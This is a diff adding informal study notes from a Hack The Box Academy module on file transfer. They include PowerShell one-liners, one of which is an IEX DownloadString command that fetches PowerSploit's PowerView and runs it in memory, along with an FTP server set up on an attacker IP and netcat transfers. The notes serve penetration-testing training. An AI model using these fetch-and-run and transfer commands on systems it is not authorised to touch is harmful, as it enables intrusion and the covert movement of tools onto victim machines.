@@ -1,0 +1,51 @@
+URL: https://academy.hackthebox.com/module/24/section/160
+
+1. easiest most dumbest way is to base 64 encode it and copy and paste and decode it to your own system
+
+2. use the (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>') in powershell
+
+example:
+(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+
+you can make custom functions in powershell like this: function Download-File {
+    param (
+        [string]$url,
+        [string]$destination
+    )
+    (New-Object Net.WebClient).DownloadFile($url, $destination)
+}
+and give it an alias like this: 
+Download-File 'https://example.com/file.txt' 'C:\path\to\save\file.txt'
+
+and add it to your profile with this: code $profile
+
+3. ok so another cool this you can do is  run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.
+like this: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
+
+4. OMG so From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files.
+You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.
+basically curl and wget are aliases for Invoke-WebRequest
+error you might encounter are explained in the HTB page
+
+5. another cool way was the smb server method
+
+6. this is the most badass one:
+you start a ftp server with 
+`sudo pip3 install pyftpdlib`
+and then run sudo python3 -m pyftpdlib --port 21
+
+After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell Net.WebClient.
+like this:
+`(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`
+we can also set user and pass
+
+7. sending and recieving using nc:
+    reciever:
+        echo hello | nc -l -p 8080
+    sender:
+        nc localhost 8080
+    or
+    sender:
+        echo hello | nc localhost 8080
+    reciever:
+        nc -l -p 8080
